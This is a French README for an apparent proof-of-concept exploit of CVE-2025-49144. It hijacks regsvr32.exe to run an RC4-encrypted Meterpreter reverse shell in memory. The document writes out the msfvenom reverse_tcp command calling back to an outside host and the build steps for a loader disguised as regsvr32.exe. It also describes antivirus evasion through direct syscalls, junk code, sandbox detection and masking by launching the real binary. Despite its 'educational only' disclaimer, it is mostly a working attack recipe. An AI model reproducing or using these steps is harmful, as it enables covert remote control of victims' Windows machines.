# 🔓 CVE-2025-49144

Ce projet propose un PoC exploitant **CVE-2025-49144** via un détournement local de `regsvr32.exe` (LOLBIN hijacking), pour exécuter du shellcode Meterpreter chiffré avec **RC4** et injecté en mémoire via des **appels système directs** grâce à [SysWhispers3](https://github.com/klezVirus/SysWhispers3).

---

## 📦 Prérequis

- Python 3.x
- `msfvenom` (Metasploit Framework)
- MinGW-w64 (`x86_64-w64-mingw32-gcc`)
- Windows (environnement de test)

---

## 💡 Fonctionnalités

- Chiffrement/déchiffrement RC4 (clé en dur)
- Appels système directs pour l’allocation, la protection et la terminaison
- Détection environnement sandbox/VM (optionnelle)
- Aucune écriture de payload sur disque (exécution full in-memory)
- Camouflage via exécution légitime de `regsvr32.exe`

---

## ⚙️ Étapes de génération

### 1. Générer le shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -o shellcode.txt
```

### 2. Formater le shellcode pour Python

```bash
python3 format_shellcode_txt.py
```

📌 Copier le résultat dans `rc4_shellcode.py`.

### 3. Générer le header C

```bash
python3 rc4_shellcode.py
```

👉 Cela produit `encrypted_payload.h`.

### 4. Compiler le loader

```bash
x86_64-w64-mingw32-gcc loader.c syscalls.c syscalls.obj -o regsvr32.exe -mwindows -s -O2
```

---

## 📁 Composants

- `format_shellcode_txt.py` : Nettoie et reformate le shellcode brut
- `rc4_shellcode.py` : Chiffre le shellcode + génère `encrypted_payload.h`
- `loader.c` : Déchiffre, injecte et exécute le shellcode en mémoire
- `syscalls.*` : Appels noyau générés via SysWhispers3

---

## 🔍 Détails du Code (`loader.c`)

### `rc4()`

```c
void rc4(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen)
```

Implémente RC4 : S-box, KSA, PRGA et XOR à la volée.

---

### `junk()`

Fonction inutile mais présente pour casser les empreintes binaires :

```c
if (rand() % 123 == 42) MessageBoxA(...);
```

---

### `is_sandbox_environment()`

Détecte :
- RAM < 2 Go
- CPU < 2
- Inactivité > 5 min
- Uptime < 30 sec
- Présence de chaînes VMware, VirtualBox, QEMU, etc.

---

### `WinMain()`

1. **Initialise** le contexte (random, junk)
2. **Optionnel** : vérifie environnement sandbox
3. **Alloue** de la mémoire (syscall)
4. **Déchiffre** le shellcode (RC4)
5. **Protège** la mémoire (RX)
6. **Exécute** le shellcode
7. **Lance** le vrai `regsvr32.exe` pour masquer l’action
8. **Termine** le processus (syscall)

---

## ✅ Résumé des rôles

| Fonction               | Rôle                                                              |
|------------------------|-------------------------------------------------------------------|
| `rc4()`                | Déchiffrement du payload RC4 en mémoire                           |
| `junk()`               | Perturbation d’empreinte binaire                                  |
| `is_sandbox_environment()` | Bypass VM/sandbox si activé                                     |
| `WinMain()`            | Orchestration complète de l'exécution                             |

---

## ⚠️ Avertissement

> 🚨 **À des fins éducatives uniquement.**  
> Toute utilisation sans autorisation explicite constitue une violation de la loi.  
> L’auteur décline toute responsabilité en cas de détournement.
